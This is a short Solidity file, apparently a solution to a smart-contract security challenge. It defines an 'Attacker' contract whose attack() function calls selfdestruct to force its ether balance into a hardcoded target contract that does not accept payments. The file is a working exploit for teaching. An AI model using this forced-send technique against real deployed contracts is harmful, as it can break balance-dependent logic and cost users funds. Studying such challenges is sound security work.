// SPDX-License-Identifier: MIT
pragma solidity ^0.8.18;

interface IForce {

}

contract Attacker {
    address constant public TARGET_ADDRESS = 0xa1f46A3b753644718d6Cddd710f004a32fD41a27; 
    IForce target = IForce(TARGET_ADDRESS);

    function attack() public {
        selfdestruct(payable(address(target)));
    }

    fallback() external payable {}
}